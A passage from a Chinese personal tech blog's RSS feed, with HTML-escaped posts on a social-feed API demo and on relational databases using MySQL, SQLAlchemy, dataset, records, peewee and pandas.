  &lt;span class="s1"&gt;&amp;#39;object&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;foreign_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;This bird is absolutely beautiful. Glad it&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;s recovering from a damaged wing.&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="c1"&gt;# jack&amp;#39;s timeline feed follows chris&amp;#39; user feed.&lt;/span&gt;
&lt;span class="n"&gt;jack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;timeline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jack&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;follow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# read the timeline for jack, chris post will show up here&lt;/span&gt;
&lt;span class="n"&gt;activities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;results&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;# read the next page, use id filtering for optimal performance&lt;/span&gt;
&lt;span class="n"&gt;next_activities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;id_lte&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;activities&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;results&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;# remove the activity by referencing the foreign_id you provided&lt;/span&gt;
&lt;span class="n"&gt;chris&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove_activity&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;foreign_id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;django demo&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://exampledjango.getstream.io/"&gt;exampledjango&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 08 Jun 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-06-08:notification-system-thinking-concept-and-Implementation.html</guid><category>code</category></item><item><title>关系型数据库小结</title><link>/relational-database-summary.html</link><description>&lt;p&gt;平时用ORM偏多，生疏了SQL，周末翻了一遍《SQL必知必会》，也整理了一下相关工具，做个记录&lt;/p&gt;
&lt;h1&gt;关系数据库（Relational database）&lt;/h1&gt;
&lt;p&gt;按照维基百科说法&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;表(关系Relation)是以行(属性Attribate)和列(值组Tuble)的形式组织起来的数据的集合。一个数据库包括一个或多个表 (关系Relation)。例如，可能有一个有关作者信息的名为authors的表(关系Relation)。每列(值组Tuble)都包含特定类型的信息，如作者的姓氏。每行(属性Attribate)都包含有关特定作者的所有信息：姓、名、住址等等。在关系型数据库当中一个表 (关系Relation)就是一个关系，一个关系数据库可以包含多个表(关系Relation)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;开源的关系数据库中，PostgreSQL 与MySQL 最为流行。一般使用linux发行版的包管理器就能方便地安装，更多的安装方式可以参考官网&lt;/p&gt;
&lt;h1&gt;客户端&lt;/h1&gt;
&lt;p&gt;关系数据库中，我用MySQL和SQLite偏多，所以列出这两个数据库相关的工具&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.mysql.com/products/workbench/"&gt;MySQL Workbench&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/dbcli/mycli"&gt;mycli&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mesasqlite.en.softonic.com/mac"&gt;MesaSQLite&lt;/a&gt;，本地应用首选是sqlite&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然更经常地，我偏好在jupyter里使用sqlalchemy来连接数据库&lt;/p&gt;
&lt;h1&gt;SQL&lt;/h1&gt;
&lt;p&gt;《SQL必知必会》（第三版）里的代码:&lt;a href="https://github.com/wwj718/teach-yourself-sql.git"&gt;teach-yourself-sql&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用mycli连接数据库&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;CREATE&lt;/span&gt; &lt;span class="k"&gt;DATABASE&lt;/span&gt; &lt;span class="n"&gt;mytest&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--创建数据库&lt;/span&gt;
&lt;span class="n"&gt;USE&lt;/span&gt; &lt;span class="n"&gt;mytest&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--进入数据库&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mysql -u root -D mytest   &amp;lt; /tmp/teach-yourself-sql/create.txt  &lt;span class="c1"&gt;#创建新表&lt;/span&gt;
mysql -u root -D mytest   &amp;lt; /tmp/teach-yourself-sql/populate.txt  &lt;span class="c1"&gt;# 插入数据&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SHOW&lt;/span&gt; &lt;span class="n"&gt;TABLES&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;--查看表&lt;/span&gt;
&lt;span class="k"&gt;DESCRIBE&lt;/span&gt; &lt;span class="n"&gt;Customers&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;--显示表结构&lt;/span&gt;
&lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;Customers&lt;/span&gt; &lt;span class="k"&gt;limit&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--查看数据 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;查询&lt;/h3&gt;
&lt;p&gt;使用pandas做实验，存为ipynb&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/wwj718/teach-yourself-sql/blob/master/SQL.ipynb"&gt;SQL.ipynb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;todo：用SQLAlchemy实现&lt;/p&gt;
&lt;h1&gt;SQLAlchemy&lt;/h1&gt;
&lt;p&gt;SQLAlchemy是Python社区中最广泛使用的ORM工具，底层而强大&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SQLAlchemy的理念是，SQL数据库的量级和性能重要于对象集合；而对象集合的抽象又重要于表和行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;连接已有数据库&lt;/h3&gt;
&lt;p&gt;一般情况下我们已经有数据库了，那么如何将既有数据库和SQLAlchemy对接呢&lt;/p&gt;
&lt;p&gt;可以利用表的反射（Table Reflection）。把它们”导入”进来即可，这时得使用&lt;code&gt;autoload&lt;/code&gt;参数。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MetaData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Table&lt;/span&gt;
&lt;span class="c1"&gt;#使用mysql，需要安装mysql驱动&lt;/span&gt;
&lt;span class="c1"&gt;#brew install mysql-connector-c（mac）&lt;/span&gt;
&lt;span class="c1"&gt;#sudo apt-get install libmysqlclient-dev （ubuntu）&lt;/span&gt;
&lt;span class="c1"&gt;#pip install MySQL-python&lt;/span&gt;
&lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;metadata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MetaData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#连接成功&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;metadata&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt; &lt;span class="c1"&gt;#true&lt;/span&gt;
&lt;span class="n"&gt;user_table&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Table&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;metadata&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;autoload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#metadata携带连接信息&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;#打印出字段名&lt;/span&gt;
&lt;span class="n"&gt;ins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;ins&lt;/span&gt; &lt;span class="c1"&gt;#查看编译的sql&lt;/span&gt;
&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SELECT * FROM auth_user limit 5&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#直接执行sql&lt;/span&gt;

&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlalchemy&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;select&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;参考：&lt;a href="https://segmentfault.com/a/1190000004288061"&gt;SQLAlchemy入门（一）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;基于SQLAlchemy的便利工具&lt;/h2&gt;
&lt;h4&gt;&lt;a href="https://github.com/pudo/dataset"&gt;dataset&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;In short, dataset makes reading and writing data in databases as simple as reading and writing JSON files.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dataset&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#print(db.tables)&lt;/span&gt;
&lt;span class="n"&gt;table&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;
&lt;span class="c1"&gt;#result = db.query&lt;/span&gt;
&lt;span class="c1"&gt;# 导出数据 dataset.freeze(result, format=&amp;#39;json&amp;#39;, filename=&amp;#39;users.json&amp;#39;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;&lt;a href="https://github.com/kennethreitz/records"&gt;records&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;SQL for Humans&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;易于导出到xls或是json。records 使用了 tablib 可以导出为任何格式&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;records&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Database&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;rows&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;select * from auth_user limit 5&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;rows&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dataset&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;&lt;a href="https://github.com/coleifer/peewee"&gt;peewee&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;a small, expressive orm -- supports postgresql, mysql and sqlite&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用习惯和django orm很像&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# http://docs.peewee-orm.com/en/latest/peewee/example.html&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;peewee&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;

&lt;span class="n"&gt;mysql_db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLDatabase&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;yunfan&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8mb4&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#CREATE DATABASE `yunfan` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;  创建数据库使用utf-8 否则有编码问题&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;QiniuStore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;course_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#key是关键字&lt;/span&gt;
    &lt;span class="n"&gt;file_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;filesize&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#endUser = Column(String(100),nullable=True)&lt;/span&gt;
    &lt;span class="n"&gt;create_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DateTimeField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Meta&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;database&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mysql_db&lt;/span&gt;
        &lt;span class="n"&gt;order_by&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-create_time&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,)&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;mysql_db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;mysql_db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_tables&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;QiniuStore&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;pandas&lt;/h1&gt;
&lt;p&gt;pandas的DataFrame大多时候也用来容纳二维数据，像一张&lt;code&gt;表&lt;/code&gt;,所以易于与数据库打交道&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#Pandas读取Mysql数据&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pandas&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;pd&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;MySQLdb&lt;/span&gt;
&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3306&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#df = pd.read_sql(&amp;#39;select * from auth_user limit 100;&amp;#39;, con=mysql_cn)  &lt;/span&gt;
&lt;span class="n"&gt;df&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read_sql&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;select * from auth_user limit 10;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;con&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Read SQL query into a DataFrame ,之后可以使用pandas的查询和绘图统计功能&lt;/p&gt;
&lt;p&gt;参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/u011715678/article/details/48497291"&gt;利用Python 的 Pandas进行数据分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pandas.pydata.org/pandas-docs/stable/comparison_with_sql.html"&gt;comparison_with_sql&lt;/a&gt;: pd与sql比较&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;心得&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;数据库的重点是表，操作可以用python方法，为了查询的灵活，还是需要sql&lt;/li&gt;
&lt;li&gt;用好ORM的前提是了解关系数据库的概念和典型用例&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;理解&lt;/h3&gt;
&lt;p&gt;数据库表是一个二维表，包含多行多列。把一个表的内容用Python的数据结构表示出来的话，可以用一个list表示多行，list的每一个元素是tuple，表示一行记录&lt;/p&gt;
&lt;p&gt;行，想象为二维数据(csv),外键是一种关系  &lt;/p&gt;
&lt;h3&gt;通用技能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;多维数据的可视化 （降维）是一个常见的问题模式 。如何聚合，pandas部分&lt;/li&gt;
&lt;li&gt;帆船项目 帮助理解pandas如何用于web流&lt;ul&gt;
&lt;li&gt;如何实时读取sql，这样一来oricle问题就解决了 可视化问题&lt;/li&gt;
&lt;li&gt;从真实数据学习数据图表化的原理  《网站分析》&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;投资技能 pandas -&amp;gt; scikit-learn   &lt;/li&gt;
